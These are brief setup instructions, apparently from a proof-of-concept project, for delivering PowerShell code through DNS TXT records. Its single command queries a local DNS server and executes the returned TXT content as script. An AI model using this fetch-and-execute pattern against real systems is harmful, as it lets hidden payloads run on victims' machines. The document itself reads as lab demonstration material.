- Install-Package ARSoft.Tools.Net (NuGet)
- Execute: "powershell . (nslookup -q=txt example.com 127.0.0.1)[-1]"
  The locahohost IP has to be given to differentiate between the "real" domain and the locally running one.
